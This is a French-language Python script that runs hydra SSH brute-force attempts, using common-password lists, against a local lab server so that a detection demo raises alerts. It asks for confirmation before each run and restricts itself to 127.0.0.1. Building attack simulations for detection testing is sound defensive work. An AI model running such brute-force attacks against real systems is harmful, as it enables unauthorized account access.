"""Génère de vraies tentatives SSH contre la VM labo (Ubuntu WSL) pour la démo.

À lancer depuis Kali (WSL). La cible est le serveur SSH d'Ubuntu sur 127.0.0.1:2222.
Rien n'est exécuté sans confirmation. Aucune cible hors du labo n'est autorisée.
"""
import subprocess
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = "2222"

SCENARIOS = {
    "brute": {
        "desc": "Force brute sur root et admin (échecs → alerte high)",
        "users": "root admin test",
        "passwords": "123456 password admin root toor letmein qwerty 000000",
        "valid": False,
    },
    "success": {
        "desc": "Force brute réussie sur 'victime' (→ alerte critique)",
        "users": "victime",
        "passwords": "123456 password wrong1 wrong2 Test1234",
        "valid": True,
    },
}


def run_scenario(name: str) -> None:
    sc = SCENARIOS[name]
    # Fichiers temporaires de listes pour hydra.
    with open("/tmp/ad_users.txt", "w") as f:
        f.write("\n".join(sc["users"].split()))
    with open("/tmp/ad_pass.txt", "w") as f:
        f.write("\n".join(sc["passwords"].split()))

    cmd = ["hydra", "-L", "/tmp/ad_users.txt", "-P", "/tmp/ad_pass.txt",
           "-s", TARGET_PORT, "-t", "4", "-f" if sc["valid"] else "-V",
           f"ssh://{TARGET_HOST}"]
    print(f"\n== {name} : {sc['desc']} ==")
    print("Commande :", " ".join(cmd))
    if input("Lancer ? [o/N] ").strip().lower() != "o":
        print("Annulé.")
        return
    subprocess.run(cmd, check=False)  # noqa: S603 - commande fixe, cible labo


if __name__ == "__main__":
    choice = sys.argv[1] if len(sys.argv) > 1 else "brute"
    if choice not in SCENARIOS:
        print("Scénarios :", ", ".join(SCENARIOS))
        sys.exit(1)
    run_scenario(choice)
